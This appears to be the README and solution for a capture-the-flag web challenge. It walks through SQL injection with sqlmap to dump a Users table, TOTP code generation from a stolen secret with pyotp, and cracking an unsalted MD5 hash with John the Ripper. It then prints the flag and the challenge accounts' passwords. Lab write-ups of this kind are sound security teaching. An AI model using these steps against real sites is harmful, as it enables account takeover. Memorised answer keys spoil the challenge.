# Stored TOTP

Objective is for the player to infiltrate the 1337 Secur1ty website and gain access to the admin account, which contains the flag.
This will be achieved with a combination of SQL injections, password cracking, and using the Google TOTP implementation. 

## Setup

Install docker and while in the challenge directory, run
```
sudo docker build -t totp .
sudo docker run totp
```

## Solution

The vulnerable point is in the GET parameter for the /message page. It is vulnerable to a SQL injection, and tool such as SQLMap can be used against it.

When using SQLMap, you will need to provide a valid cookie for the site using '--cookie'. So, you will need to create an account.

Upon dumping the contents of the database, the items of interest are the Secret and Password columns for 1337-admin in the Users table. 
```
sqlmap -u http://<IP>/message?id=1 --cookie='secret=<secret>; userid=<userid>' -D 1337_Secur1ty -T Users --dump
```

Using Google Authenticator for PHP or Python, you can get the current TOTP code by providing the secret to the getCode() function.

I used the Python module when retrieving  the TOTP code.
```
import pyotp

totp = pyotp.TOTP('<secret>')
print totp.now()
```

With the password, the password is hashed using MD5 with no salt and the plaintext is from the RockYou wordlist. 

I used John the Ripper to crack the password.
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 CrackMe.txt
```

Upon retrieving both the TOTP code and the password, you will be able to log into the admin account and you will see the flag on the profile page.

gigem{th3_T0tp_1s_we4k_w1tH_yoU}

## Notes

The password for ScrubLord is 58BByb9HwvBv2EJsOJ.

The password for 1337-admin is secretpasscode.
